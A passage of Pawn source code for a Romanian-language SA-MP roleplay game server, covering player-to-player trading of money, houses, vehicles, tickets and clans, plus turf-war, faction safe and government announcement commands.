	if(TradeTicket[id][0] != 0) {
		PlayerInfo[playerid][pTickets][0] += TradeTicket[id][0];
		PlayerInfo[id][pTickets][0] -= TradeTicket[id][0];
		format(string2, sizeof(string2), "%d Rainbow Ticket(s) ", TradeTicket[id][0]);
		strcat(string, string2);
		strcat(items, string2);
		save_tickete(id);
		save_tickete(playerid);	
	}
	if(TradeTicket[id][1] != 0) {
		PlayerInfo[playerid][pTickets][1] += TradeTicket[id][1];
		PlayerInfo[id][pTickets][1] -= TradeTicket[id][1];
		format(string2, sizeof(string2), "%d Vip Ticket(s) ", TradeTicket[id][1]);
		strcat(string, string2);
		strcat(items, string2);
		save_tickete(id);
		save_tickete(playerid);	
	}
	if(jobTrade[id] != -1) {
		new idd=jobTrade[id];
		format(string2, sizeof(string2), "job %s ", JobInfo[idd][jName]);
		strcat(string, string2);
		strcat(items, string2);
		
		PlayerInfo[id][pJobOwner] = 0;
		UpdateVar(id, "JobOwner", 0);
		
		strmid(JobInfo[idd][jOwner], PlayerInfo[playerid][pUsername], 0, MAX_PLAYER_NAME);
		mysql_format(SQL, gQuery, 128, "UPDATE `jobs` SET `Owner` = '%s' WHERE `ID` = '%i'", JobInfo[idd][jOwner], JobInfo[idd][jID]);
		mysql_tquery(SQL, gQuery);
		PlayerInfo[playerid][pJobOwner] = idd;
		UpdateVar(playerid, "JobOwner", idd);
		UpdateLabel(5, idd);
	}
	if clan_trade[id] *then {
		new _c=clan_trade[id];
		format(string2, sizeof(string2), "clan #%d ", ClanInfo[_c][cID]);
		strcat(string, string2);
		strcat(items, string2);

		PlayerInfo[id][pClan] = 0;
		PlayerInfo[id][pRank] = 0;
		Iter_Remove(clan_players<_c>, id);
		if PlayerInfo[id][pTag]!=-1 *then {
			SetPlayerName(playerid, PlayerInfo[id][pUsername]);
			PlayerInfo[id][pTag]=-1;
		}

		PlayerInfo[playerid][pClan]=_c;
		PlayerInfo[playerid][pRank]=7;
		Iter_Add(clan_players<_c>, playerid);

		format(gString, 128, "{%s}[CLAN] %s este noul lider.", ClanInfo[_c][clColor], GetName(playerid));
		SendClanMessage(_c, gString);

		_query("UPDATE `users` SET `Clan`='0',`Rank`='0',`Tag`='-1' WHERE `id`='%i'", PlayerInfo[id][pSQLID]);
		_query("UPDATE `users` SET `Clan`='%i',`Rank`='7' WHERE `id`='%i'", _c, PlayerInfo[playerid][pSQLID]);
	}
	if hat_trade[id]!=-1 *then {
		new h=hat_trade[id];
		format(string2, sizeof(string2), "%s ", name_hats[h]);
		strcat(string, string2);
		strcat(items, string2);

		PlayerInfo[playerid][pAccessories][h]++;
		PlayerInfo[id][pAccessories][h]--;
		save_accesories(playerid);
		save_accesories(id);
	}
	if laser_trade[id]!=-1 *then {
		new l=laser_trade[id];
		format(string2, sizeof(string2), "laser %s ", laser_color[l]);
		strcat(string, string2);
		strcat(items, string2);

		PlayerInfo[playerid][pAccessories][l+16]++;
		PlayerInfo[id][pAccessories][l+16]--;
		save_accesories(playerid);
		save_accesories(id);
	}
	if material_trade[id] *then {
		format(string2, sizeof(string2), "%d materiale ", material_trade[id]);
		strcat(string, string2);
		strcat(items, string2);
	
		UpdateVar(playerid, "Materials", PlayerInfo[id][pMats]-=material_trade[id]);
		UpdateVar(id, "Materials", PlayerInfo[playerid][pMats]+=material_trade[id]);
	}
	if p_Ticket[id] *then {
		format(string2, sizeof(string2), "%d ticket fuel(s) ", p_Ticket[id]);
		strcat(string, string2);
		strcat(items, string2);
	
		PlayerInfo[playerid][pTickets][2]+=p_Ticket[id];
		PlayerInfo[id][pTickets][2]-=p_Ticket[id];

		save_tickete(playerid),save_tickete(id);
	}
	if c_Ticket[id] *then {
		format(string2, sizeof(string2), "%d ticket house custom(s) ", c_Ticket[id]);
		strcat(string, string2);
		strcat(items, string2);
	
		PlayerInfo[playerid][pTickets][3]+=c_Ticket[id];
		PlayerInfo[id][pTickets][3]-=c_Ticket[id];
		save_tickete(playerid),save_tickete(id);
	}
	SendClientMessage(playerid, COLOR_GOLD, string);
	
	format(log, sizeof(log), "%s pe [%s], lui %s (user:%d).", log, items, GetName(id), PlayerInfo[id][pSQLID]);
	InsertLog(playerid, log, LOG_TRADE);	
	InsertLog(id, log, LOG_TRADE);
	SendAdminMessage(COLOR_YELLOW, log, 1);
	
	CancelSelectTextDraw(playerid);
	DestroyTradeItems(playerid);
	
	CancelSelectTextDraw(id);
	DestroyTradeItems(id);
	return true;
}

	

stock AddTradeItem(playerid, type, amount) {
	new tid, pid, id = TradeID[playerid], Models = -1, bool: VehColor = false; gString[0] = EOS;
	if(TradeItems[playerid] == 5) return true;
	if(TradeAccepted[playerid] == 0) {
		tid = TradeItems[playerid]+11;
		pid = TradeItems[playerid];
	}
	if(TradeAccepted[playerid] == 1) {
		tid = TradeItems[playerid]+16;
		pid = TradeItems[playerid]+5;	
	}		
	TradeItems[playerid] ++;
	TextDrawShowForPlayer(playerid, TradeTD[tid]);
	TextDrawShowForPlayer(id, TradeTD[tid]);
	switch(type) {
		case 0: {
			MoneyTrade[playerid] = amount;
			format(gString, 20, "$%s", FormatNumber(amount));
			Models = 1212;
			SCMf(playerid, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat $%s.", GetName(playerid), FormatNumber(amount));
			SCMf(id, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat $%s.", GetName(playerid), FormatNumber(amount));
		}	
		case 1: {
			HouseTrade[playerid] = PlayerInfo[playerid][pHouse];
			format(gString, 20, "House %d", PlayerInfo[playerid][pHouse]);
			Models = 1273;		
			SCMf(playerid, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat casa #%d.", GetName(playerid), amount);
			SCMf(id, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat casa #%d.", GetName(playerid), amount);
		}
		case 2: {
			BusinessTrade[playerid] = PlayerInfo[playerid][pBizz];
			format(gString, 20, "Business %d", PlayerInfo[playerid][pBizz]);
			Models = 1272;			
			SCMf(playerid, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat business-ul #%d.", GetName(playerid), amount);
			SCMf(id, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat business-ul #%d.", GetName(playerid), amount);
		}
		case 3: {
			CarTrade[playerid] = amount;
			Models = CarInfo[amount][cModel];	
			VehColor = true;

			sendSplittedMessageToPlayer(playerid, COLOR_LIGHTGOLD, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat %s(#%d) [Age: %d days | Odometer: %.2f km | Insurance: $%d (%d points) | Colors: %d,%d].", GetName(playerid), GetVehicleName(CarInfo[amount][cModel]), CarInfo[amount][cID], CarInfo[amount][Dayss], CarInfo[amount][KM], FormatNumber(CarInfo[amount][cTax]), CarInfo[amount][cPoints], CarInfo[amount][cColorOne], CarInfo[amount][cColorTwo]);
			sendSplittedMessageToPlayer(id, COLOR_LIGHTGOLD, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat %s(#%d) [Age: %d days | Odometer: %.2f km | Insurance: $%d (%d points) | Colors: %d,%d].", GetName(playerid), GetVehicleName(CarInfo[amount][cModel]), CarInfo[amount][cID], CarInfo[amount][Dayss], CarInfo[amount][KM], FormatNumber(CarInfo[amount][cTax]), CarInfo[amount][cPoints], CarInfo[amount][cColorOne], CarInfo[amount][cColorTwo]);
			va_SendClientMessage(id, COLOR_LIGHTGOLD, "Other: {FFFFFF}%s", TotalUp(amount));
			va_SendClientMessage(playerid, COLOR_LIGHTGOLD, "Other: {FFFFFF}%s", TotalUp(amount));
			format(gString, 50, "%s", aVehicleNames[CarInfo[amount][cModel]-400]);
		}
		case 4: {
			VoucherTrade[playerid][0] = amount;
			format(gString, 50, "Vouchers %d (Rare)", amount);
			Models = 1581;
			SCMf(playerid, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat %dx Rare Voucher(s) (50 Premium Points).", GetName(playerid), amount);
			SCMf(id, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat %dx Rare Voucher(s) (50 Premium Points).", GetName(playerid), amount);
		}
		case 5: {
			VoucherTrade[playerid][1] = amount;
			format(gString, 50, "Vouchers %d (Epic)", amount);
			Models = 1581;
			SCMf(playerid, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat %dx Epic Voucher(s) (100 Premium Points).", GetName(playerid), amount);
			SCMf(id, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat %dx Epic Voucher(s) (100 Premium Points).", GetName(playerid), amount);
		}
		case 6: {
			VoucherTrade[playerid][2] = amount;
			format(gString, 60, "Vouchers %d (Legendary)", amount);
			Models = 1581;
			SCMf(playerid, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat %dx Legendary Voucher(s) (250 Premium Points).", GetName(playerid), amount);
			SCMf(id, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat %dx Legendary Voucher(s) (250 Premium Points).", GetName(playerid), amount);
		}
		case 7: {
			SkinTrade[playerid] = amount;
			format(gString, 50, "skin %d~n~%s", amount, GetSkinType(amount));
			Models = amount;
			SCMf(playerid, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat skin #%d.", GetName(playerid), amount);
			SCMf(id, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat skin #%d.", GetName(playerid), amount);
		}
		case 8: {
			HiddenTrade[playerid] = amount;
			format(gString, 50, "%d Hidden(s)", amount);
			Models = 365;	
			SCMf(playerid, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat %dx hidden Color(s).", GetName(playerid), amount);
			SCMf(id, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat %dx hidden Color(s).", GetName(playerid), amount);
		}
		case 9: {
			MiliardTrade[playerid] = amount;
			format(gString, 50, "$%d.000.000.000", amount);			
			Models = 1212;
			SCMf(playerid, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat $%d.000.000.000.", GetName(playerid), amount);
			SCMf(id, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat $%d.000.000.000.", GetName(playerid), amount);
		}
		case 10: {
			TradeTicket[playerid][0] = amount;
			format(gString, 50, "%d Rainbow tickets", amount);
			Models = 1581;	
			SCMf(playerid, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat %dx Rainbow Ticket(s).", GetName(playerid), amount);
			SCMf(id, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat %dx Rainbow Ticket(s).", GetName(playerid), amount);
		}
		case 11: {
			TradeTicket[playerid][1] = amount;
			format(gString, 30, "%d Vip Tickets", amount);
			PlayerTextDrawSetPreviewModel(playerid, TradeIcon[playerid][pid], 1581);
			PlayerTextDrawSetPreviewModel(id, TradeIcon[id][pid], 1581);	
			Models = 1581;		
			SCMf(playerid, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat %dx Vip Ticket(s).", GetName(playerid), amount);
			SCMf(id, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat %dx Vip Ticket(s).", GetName(playerid), amount);
		}
		case 12: {
			jobTrade[playerid] = amount;
			format(gString, 20, "Job %s", JobInfo[amount][jName]);
			Models = 19130;		
			SCMf(playerid, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat jobul %s.", GetName(playerid), JobInfo[amount][jName]);
			SCMf(id, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat jobul %s.", GetName(playerid), JobInfo[amount][jName]);
		}
		case 13: {
			VoucherTrade[playerid][3] = amount;
			format(gString, 50, "Vouchers %d (mythic)", amount);
			Models = 1581;
			SCMf(playerid, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat %dx mythic Voucher(s) (250 Premium Points).", GetName(playerid), amount);
			SCMf(id, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat %dx mythic Voucher(s) (250 Premium Points).", GetName(playerid), amount);
		}
		case 14: {
			VoucherTrade[playerid][4] = amount;
			format(gString, 50, "Vouchers %d (Millionaries)", amount);
			Models = 1581;
			SCMf(playerid, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat %dx Millionaries Voucher(s) (1000 Premium Points).", GetName(playerid), amount);
			SCMf(id, COLOR_LIGHTGOLD, "TRADE: {FFFFFF}%s a adaugat %dx Millionaries Voucher(s) (1000 Premium Points).", GetName(playerid), amount);
		}
		case 15: {
			clan_trade[playerid] = amount;
			format(gString, 30, "Clan #%d", ClanInfo[amount][cID]);
			format(srsString, 144, "TRADE: {FFFFFF}%s a clan-ul %s (#%d) | Tag: %s | Days: %d", GetName(playerid), ClanInfo[amount][clName], ClanInfo[amount][cID], ClanInfo[amount][clTag], ClanInfo[amount][clDays]);
			SendClientMessage(playerid, COLOR_LIGHTGOLD, srsString),SendClientMessage(id, COLOR_LIGHTGOLD, srsString);
		}
		case 16: {
			hat_trade[playerid] = amount;
			format(gString, 30, "%s", name_hats[amount]);
			format(srsString, 144, "TRADE: {FFFFFF}%s a adaugat %s.", GetName(playerid), name_hats[amount]);
			SendClientMessage(playerid, COLOR_LIGHTGOLD, srsString),SendClientMessage(id, COLOR_LIGHTGOLD, srsString);
			
			static const _models[] = {19066,19528,18919, 18914, 18915, 18916, 18917, 18918, 18920,11704,321};
			Models=_models[amount];
		}
		case 17: {
			laser_trade[playerid] = amount;
			format(gString, 30, "Laser %s", laser_color[amount]);
			format(srsString, 144, "TRADE: {FFFFFF}%s a adaugat laser %s.", GetName(playerid), laser_color[amount]);
			SendClientMessage(playerid, COLOR_LIGHTGOLD, srsString),SendClientMessage(id, COLOR_LIGHTGOLD, srsString);
			
			new const lasers[] = {19081, 19084, 18643, 19080, 19082, 19083};
			Models=lasers[amount];
		}
		case 18: {
			material_trade[playerid]=amount;
			format(gString, 60, "%d materials", amount);
			format(srsString, 144, "TRADE: {FFFFFF}%s a adaugat %d materiale.", GetName(playerid), amount);
			SendClientMessage(playerid, COLOR_LIGHTGOLD, srsString),SendClientMessage(id, COLOR_LIGHTGOLD, srsString);
		}
		case 19: {
			p_Ticket[playerid]=amount;
			format(gString, 60, "%d ticket fuel", amount);
			format(srsString, 144, "TRADE: {FFFFFF}%s a adaugat %d ticket premium fuel.", GetName(playerid), amount);
			SendClientMessage(playerid, COLOR_LIGHTGOLD, srsString),SendClientMessage(id, COLOR_LIGHTGOLD, srsString);
		}
		case 20: {
			c_Ticket[playerid]=amount;
			format(gString, 60, "%d custom house", amount);
			format(srsString, 144, "TRADE: {FFFFFF}%s a adaugat %d ticket custom house.", GetName(playerid), amount);
			SendClientMessage(playerid, COLOR_LIGHTGOLD, srsString),SendClientMessage(id, COLOR_LIGHTGOLD, srsString);
		}
	}
	PlayerTextDrawSetPreviewModel(playerid, TradeIcon[playerid][pid], Models);
	PlayerTextDrawSetPreviewModel(id, TradeIcon[id][pid], Models);	
	if(VehColor) {
		PlayerTextDrawSetPreviewVehCol(playerid, TradeIcon[playerid][pid], CarInfo[amount][cColorOne], CarInfo[amount][cColorTwo]);
		PlayerTextDrawSetPreviewVehCol(id, TradeIcon[id][pid], CarInfo[amount][cColorOne], CarInfo[amount][cColorTwo]);
		PlayerTextDrawSetSelectable(playerid, TradeIcon[playerid][pid], true);
		PlayerTextDrawSetSelectable(id, TradeIcon[id][pid], true);
	}
	PlayerTextDrawSetString(playerid, TradeTitle[playerid][pid], gString);
	PlayerTextDrawSetString(id, TradeTitle[id][pid], gString);
	PlayerTextDrawShow(playerid, TradeTitle[playerid][pid]);	
	PlayerTextDrawShow(id, TradeTitle[id][pid]);	
	PlayerTextDrawShow(playerid, TradeIcon[playerid][pid]);	
	PlayerTextDrawShow(id, TradeIcon[id][pid]);		
	return true;
}

cmd:trade(playerid, params[]) {
	new id;	
	if(sscanf(params, "u", id)) 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/trade <playerid/name>");
	
	if(GetPlayerInterior(playerid) != 0 || IsPlayerInAnyVehicle(playerid)) 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti face o afacere dintr-un interior sau vehicul!");
	
	if(GetDistanceBetweenPlayers(playerid,id) > 5) 
		return SendClientMessage(playerid, COLOR_GREY, "Nu esti langa acel player");

	if(!IsPlayerConnected(id)) 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	/*if(!strcmp(GetIPP(playerid), GetIPP(id), true)) 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti transfera bani de pe acelasi IP.");*/

	if(PlayerInfo[id][pLevel] < 3 || PlayerInfo[playerid][pLevel] < 3) 
		return SendClientMessage(playerid, COLOR_GREY, "Tu sau acel jucator nu aveti nivel peste 3!");
	
	if(TradePlayer[id] == playerid) 
		return SendClientMessage(playerid, -1, "I-ai mai facut o oferta acestui jucator!");

	if(TradeID[playerid] != -1) 
		return SendClientMessage(playerid, COLOR_WHITE, "Esti deja intr-o afacere!");

	if(playerid == id) 
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti executa aceasta comanda asupra ta!");

	if(player_selected[id])
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu este intr-un vehicul.");

	TradePlayer[id] = playerid;
	SCMf(playerid, COLOR_LIGHTBLUE, "* L-ai invitat pe %s (%d) pentru a face afaceri.", GetName(id), id);
	SCMf(id, COLOR_LIGHTBLUE, "* %s (%d) te-a invitat sa faceti afaceri. Foloseste (/accept trade %d) pentru a accepta invitatia.", GetName(playerid), playerid, playerid);	
	return true;
} 

cmd:findhouse(playerid, params[]) {
	if(CP[playerid] != 0) return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Do you want to cancel your current checkpoint?", "Yes", "No");
	new id;
	if(sscanf(params, "i",id)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/findhouse <id>");
	if id>sql_houses *then return SendClientMessage(playerid, COLOR_LGREEN, "Invalid House ID");
	if !HouseInfo[id][hID] *then return SendClientMessage(playerid, COLOR_LGREEN, "Invalid House ID");
	CP[playerid] = 43;
	SetPlayerCheckpoint(playerid, HouseInfo[id][hEntrancex], HouseInfo[id][hEntrancey], HouseInfo[id][hEntrancez], 5.0);
	new string[180];
	format(string, sizeof(string), "Ti-a fost pus un punct rosu pe harta catre casa cu ID-ul %d. Distanta: %.2fm", id, GetPlayerDistanceFromPoint(playerid, HouseInfo[id][hEntrancex], HouseInfo[id][hEntrancey], HouseInfo[id][hEntrancez]));
	SendClientMessage(playerid, COLOR_YELLOW, string);
	return true;
}
cmd:findbiz(playerid, params[]) {
	if(CP[playerid] != 0) return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Do you want to cancel your current checkpoint?", "Yes", "No");
	new id;
	if(sscanf(params, "i",id)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/findbiz <id>");
	if(id>bussines) return SendClientMessage(playerid, -1, "ID Invalid!");
	if !BizzInfo[id][bID] *then return SendClientMessage(playerid, -1, "ID Invalid!");
	CP[playerid] = 43;
	if(BizzInfo[id][bStatic] == 0) SetPlayerCheckpoint(playerid, BizzInfo[id][bEntranceX], BizzInfo[id][bEntranceY], BizzInfo[id][bEntranceZ], 5.0);
	else SetPlayerCheckpoint(playerid,BizzInfo[id][bEntranceX],BizzInfo[id][bEntranceY],BizzInfo[id][bEntranceZ], 5.0);
	new string[180];
	format(string, sizeof(string), "Ti-a fost pus un punct rosu pe harta catre afacerea cu ID-ul %d. Distanta: %0.2fm", id, GetPlayerDistanceFromPoint(playerid, BizzInfo[id][bEntranceX], BizzInfo[id][bEntranceY], BizzInfo[id][bEntranceZ]));
	SendClientMessage(playerid, COLOR_YELLOW, string);
	return true;
}
cmd:attack(playerid, params[]) {
	if(!IsAMember(playerid)) return SendClientMessage(playerid,COLOR_GREY, "Nu faci parte dintr-o mafie.");
	if(PlayerInfo[playerid][pRank] < 3) return SendClientMessage(playerid,COLOR_LIGHTBLUE,"You do not have rank 3.");

	if GetPlayerInterior(playerid) *then
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda dintr-un interior!");

	new turf = IsPlayerOnTurf[playerid],string[100];
	new hour,minute,second;
	gettime(hour,minute,second);
	if(PlayerInfo[playerid][pAdmin] < 7) {
		if(GetWeekDay()==Duminica||GetWeekDay()==Sambata) return SendClientMessage(playerid, COLOR_LIGHTRED, "Nu se dau war-uri in weekend!");	
		if(14 < hour > 17) return SendClientMessage(playerid, COLOR_LIGHTRED, "War-uri se pot da doar in intervalul 15:00 - 17:00!");
		if(GetFactionMembersOn2(PlayerInfo[playerid][pMember]) < 2) return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda deoarece nu sunt minim 3 membri conectati din factiunea ta!");
		if(GetFactionMembersOn2(TurfInfo[turf][zOwned]) < 2) return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda deoarece nu sunt minim 3 membri conectati din factiunea care detine teritoriul!");			
	}	
    if(turf == 0) return SendClientMessage(playerid, COLOR_WHITE, "Nu esti pe un teritoriu!");
    new faction = PlayerInfo[playerid][pMember];
    if(TurfInfo[turf][zOwned] == faction) return SendClientMessage(playerid, COLOR_GREY, "Nu poti ataca turful mafiei tale.");
	if(WarInfo[turf][wAttacker] != 0) return SendClientMessage(playerid, COLOR_WHITE, "Acest turf este deja atacat.");
	if(InWarTurf[faction] != -1) return SendClientMessage(playerid, COLOR_WHITE, "Este deja un war activ.");
	if(InWarTurf[TurfInfo[turf][zOwned]] != -1) return SendClientMessage(playerid, COLOR_WHITE, "Aceasta mafie are deja un war activ.");
	if(FactionDeelay[PlayerInfo[playerid][pMember]]>gettime() && !IsAdmin(playerid, 7)) {
		format(string, sizeof(string), "Poti folosi aceasta comanda peste %d minute (%d secunde).", (FactionDeelay[PlayerInfo[playerid][pMember]]-gettime())/60, FactionDeelay[PlayerInfo[playerid][pMember]]-gettime());
		SendClientMessage(playerid, COLOR_LGREEN, string);
		return true;
	}
	format(string, sizeof(string), "[WAR] %s started a war with %s.",FactionName(WarInfo[turf][wAttacker]), FactionName(TurfInfo[turf][zOwned]));
	SendAdminMessage(COLOR_LOGS, string, 1);
	format(string, sizeof(string), "[WAR] %s a atacat teritoriul %d detinut de factiunea %s.",GetName(playerid),turf,FactionName(TurfInfo[turf][zOwned]));
	SendFactionMessage(faction,COLOR_MONEY,string);
	format(string, sizeof(string), "[WAR] %s (%s) a atacat teritoriul %d detinut de factiunea ta.",FactionName(WarInfo[turf][wAttacker]),GetName(playerid),turf);
	SendFactionMessage(TurfInfo[turf][zOwned],COLOR_MONEY,string);
	_query("UPDATE `turfs` SET `Time`='24' WHERE `ID`='%d'",turf);
	
	TurfInfo[turf][zTime] = 24;
	if(PlayerInfo[playerid][pAdmin] == 7) WarInfo[turf][wTime] = 120;
	else WarInfo[turf][wTime] = 1200;
	Iter_Add(turf_in_war, turf);
	WarInfo[turf][wAttacker] = faction;
	WarInfo[turf][wFaction] = TurfInfo[turf][zOwned];
	worstscoreat[turf] = 0;
	worstmemberat[turf] = -1;
	bestscoreat[turf] = 0;
	bestmemberat[turf] = -1;
	foreach(new p: faction_players<faction>) SetPlayerSkin(p, faction_skin(p)), SendClientMessage(p, COLOR_CLIENT, "WAR: Ai primit skinul factiunii deoarece esti in timpul unui war!");
	foreach(new p: faction_players<TurfInfo[turf][zOwned]>) SetPlayerSkin(p, faction_skin(p)), SendClientMessage(p, COLOR_CLIENT, "WAR: Ai primit skinul factiunii deoarece esti in timpul unui war!");
		
	switch(WarInfo[turf][wAttacker]) {
		case 4: GangZoneFlashForAll(Turfs[turf], 0x0CAB3C99);
		case 5: GangZoneFlashForAll(Turfs[turf], 0x11F2F299);
		case 6: GangZoneFlashForAll(Turfs[turf], 0xFAD40099);
		case 10: GangZoneFlashForAll(Turfs[turf], 0xAB00FA99);
		case 17: GangZoneFlashForAll(Turfs[turf], 0x25252799);
		case 18: GangZoneFlashForAll(Turfs[turf], 0x1B376D99);
		case 25: GangZoneFlashForAll(Turfs[turf], 0x88421D99);
		case 26: GangZoneFlashForAll(Turfs[turf], 0x66990099);
		case 27: GangZoneFlashForAll(Turfs[turf], 0xCC330099);
	}
	InWarTurf[faction] = turf;
	InWarTurf[TurfInfo[turf][zOwned]] = turf;

	SetVehicle(faction, turf);
	SetVehicle(TurfInfo[turf][zOwned], turf);
	return true;
}

redist::SetVehicle(fid, turf) {
	new f;
	switch(fid) {
		case 4: f=0;
    	case 5: f=1;
    	case 6: f=2;
    	case 10: f=3;
    	case 17: f=4;
    	case 18: f=5;
    	case 25: f=6;
    	case 26: f=7;
    	case 27: f=8;
	}
	foreach(new i : FactionVehicle<f>) SetVehicleVirtualWorld(i, turf);				
	return true;
}

redist::RespawnVehicle(fid) {
	new f;
	switch(fid) {
		case 4: f=0;
		case 5: f=1;
		case 6: f=2;
		case 10: f=3;
		case 17: f=4;
		case 18: f=5;
		case 25: f=6;
		case 26: f=7;
		case 27: f=8;
	}
	foreach(new i : FactionVehicle<f>) {
		SetVehicleVirtualWorld(i, 0);
		SetVehicleToRespawn(i);	
	}					
	return true;
}

cmd:turfs(playerid, params[]) {
	format(gString, 180, "Option\tStatus\tTop Owned Turfs\nGang Turfs\t%s\t%s with %d turfs\nClan Turfs\t%s\t%s with %d turfs", TurfsDisp[playerid]?("{3BBF0B}Enabled"):("{FF0000}Disabled"), DynamicFactions[FactionTop][fName], DynamicFactions[FactionTop][fTop],togClanTurf[playerid]?("{3BBF0B}Enabled"):("{FF0000}Disabled"), ClanInfo[ClanTop][clName], ClanInfo[ClanTop][clTop]);
	ShowPlayerDialog(playerid, DIALOG_TOGTURFS, DIALOG_STYLE_TABLIST_HEADERS, "SERVER: Turfs", gString, "Select", "Cancel");
	return true;
}
cmd:fdeposit(playerid, params[]) {
	for(new s = 0; s < sizeof(SafeInfo); s++) {
		if(!PlayerToPoint(5, playerid, SafeInfo[s][sPosX], SafeInfo[s][sPosY], SafeInfo[s][sPosZ]))
			continue;

		if(PlayerInfo[playerid][pMember] != SafeInfo[s][sFactionID])
			continue;

		if(TradeID[playerid] != -1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta comanda atata timp cat esti implicat intr-o afacere!");
		SeifID[playerid] = PlayerInfo[playerid][pMember]-1;
		ShowPlayerDialog(playerid, DIALOG_FDEPOSIT, DIALOG_STYLE_LIST, "Faction deposit", "Money\nMaterials\nDrugs", "Ok", "Exit");
	}
	return true;
}
cmd:fwithdraw(playerid, params[]) {
	if(PlayerInfo[playerid][pRank] < 6)
		return true;

	if(TradeID[playerid] != -1) 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta comanda atata timp cat esti implicat intr-o afacere!");

	for(new s = 0; s < sizeof(SafeInfo); s++) {
		if(!PlayerToPoint(5, playerid, SafeInfo[s][sPosX], SafeInfo[s][sPosY], SafeInfo[s][sPosZ]))
			continue;

		if(PlayerInfo[playerid][pMember] != SafeInfo[s][sFactionID])
			continue;

		SeifID[playerid] = PlayerInfo[playerid][pMember]-1;
		gString[0] = EOS;
		format(gString, 100, "Option\tResult\nMoney\t$%s\nMaterials\t%s\nDrugs\t%s\n", FormatNumber(SafeInfo[s][sMoney]), FormatNumber(SafeInfo[s][sMaterials]), FormatNumber(SafeInfo[s][sDrugs]));
		ShowPlayerDialog(playerid, DIALOG_FWITHDRAW, DIALOG_STYLE_TABLIST_HEADERS, "Faction withdraw", gString, "Ok", "Exit");
	}
	return true;
}
cmd:government(playerid, params[]) {
	if(IsACop(playerid) || PlayerInfo[playerid][pMember] == 13) {		
		if(PlayerInfo[playerid][pRank] < 5) return SendClientMessage(playerid, -1, "Ai nevoie de rank 5 pentru a folosi aceasta comanda.");
		new hour,minute,second, year, month, day;
		gettime(hour,minute,second);
		getdate(year, month, day);
		if(hour >= 00 && hour < 8) return SendClientMessage(playerid, COLOR_LIGHTRED, "Nu poti folosi aceasta comanda in intervalul 00-08.");
		new string[300],textgov[250],sendername[MAX_PLAYER_NAME];
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(sscanf(params, "s[250]", textgov)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/gov <text>");
		if(FaceReclama(textgov)) return RemoveFunction(playerid, textgov);
		if(FaceReclama(textgov)) return Reclama(playerid, textgov);
		SCMTA(COLOR_WHITE, "-------------------------- Anunt Guvernamental --------------------------");
		if(PlayerInfo[playerid][pMember] == 1) format(string, sizeof(string), "%s %s: %s", GetRankName(playerid), sendername, textgov);
		if(PlayerInfo[playerid][pMember] == 2) format(string, sizeof(string), "%s %s: %s", GetRankName(playerid), sendername, textgov);
		if(PlayerInfo[playerid][pMember] == 3) format(string, sizeof(string), "%s %s: %s", GetRankName(playerid), sendername, textgov);	
		if(PlayerInfo[playerid][pMember] == 13) format(string, sizeof(string), "%s %s: %s", GetRankName(playerid), sendername, textgov);
		if(PlayerInfo[playerid][pMember] == 14) format(string, sizeof(string), "%s %s: %s", GetRankName(playerid), sendername, textgov);
		sendSplittedMessage(0x5776FFFF, string);
	}
	else return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte din factiunea politiei sau a primariei.");
	return true;
}

stock is_mafiot_vehicle(vehicleid) {
	switch(ServerVehicles[vehicleid][vFaction]) {
		case 4: return 0;
		case 5: return 1;
		case 6: return 2;
		case 10: return 3;
		case 17: return 4;
		case 18: return 5;
		case 25: return 6;
		case 26: return 7;
		case 27: return 8;
